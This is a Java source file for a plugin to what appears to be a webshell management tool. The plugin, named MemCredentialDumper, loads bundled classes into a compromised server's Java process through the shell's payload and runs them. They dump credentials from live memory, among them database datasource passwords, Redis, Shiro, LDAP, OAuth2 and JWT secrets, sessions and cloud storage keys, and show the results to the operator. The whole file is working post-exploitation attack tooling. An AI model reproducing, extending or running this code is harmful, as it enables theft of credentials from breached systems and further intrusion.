package shells.plugins.java;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "MemCredentialDumper",
        DisplayName = "MemCredentialDumper"
)
public class MemCredentialDumper implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton extractButton = new JButton("Extract Credentials");
    private final JButton clearButton = new JButton("Clear");
    private final RTextArea resultTextArea = new RTextArea();
    private final JSplitPane splitPane = new JSplitPane();
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    public MemCredentialDumper() {
        this.resultTextArea.append("[+] MemCredentialDumper v1.1\n");
        this.resultTextArea.append("[+] Based on JDumpSpider - Live JVM Memory Credential Extractor\n");
        this.resultTextArea.append("[+] Supports: DataSource, Redis, Shiro, LDAP, OAuth2, Kafka, JWT,\n");
        this.resultTextArea.append("[+]          SpringSecurity Auth, Sessions, Cloud(OSS/COS/MinIO/Qiniu), Nacos\n");
        this.resultTextArea.append("[+] Click 'Extract Credentials' to dump secrets from target JVM.\n\n");
        this.splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        topPanel.add(this.extractButton);
        topPanel.add(this.clearButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                MemCredentialDumper.this.splitPane.setDividerLocation(0.08);
            }
        });
        this.panel.add(this.splitPane);
    }
    private void extractButtonClick(ActionEvent actionEvent) {
        try {
            this.resultTextArea.append("[*] Extracting credentials from target JVM...\n");
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("action", "extract");
            String[] classesToLoad = {"HashMemDumper", "HashBootstrap"};
            boolean loaderState = false;
            for (int i = 0; i < classesToLoad.length; i++) {
                String clsName = classesToLoad[i];
                InputStream is = this.getClass().getResourceAsStream("/" + clsName + ".class");
                if (is == null) {
                    this.resultTextArea.append("[-] " + clsName + ".class not found in plugin JAR.\n");
                    GOptionPane.showMessageDialog(this.panel, clsName + ".class missing", "Error", 2);
                    return;
                }
                byte[] classBytes = functions.readInputStream(is);
                is.close();
                reqParameter.add("class_" + clsName, classBytes);
                loaderState = this.payload.include(clsName, classBytes);
            }
            if (loaderState) {
                reqParameter.add("proxyType", "HashMemDumper");
                byte[] result = this.payload.evalFunc("HashBootstrap", "run", reqParameter);
                String resultString = this.encoding.Decoding(result);
                Log.log(resultString, new Object[0]);
                this.resultTextArea.append(resultString);
                this.resultTextArea.append("\n[+] Done.\n\n");
            } else {
                this.resultTextArea.append("[-] Class loader failed!\n\n");
                GOptionPane.showMessageDialog(this.panel, "Class loader failed!", "Error", 2);
            }
        } catch (Exception e) {
            Log.error(e);
            this.resultTextArea.append("[-] " + e.toString() + "\n");
            if (e.getCause() != null)
                this.resultTextArea.append("[-] caused by: " + e.getCause().toString() + "\n");
            this.resultTextArea.append("\n");
            GOptionPane.showMessageDialog(this.panel, e.toString(), "Error", 2);
        }
    }
    private void clearButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText("");
    }
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }
    public JPanel getView() {
        return this.panel;
    }
}
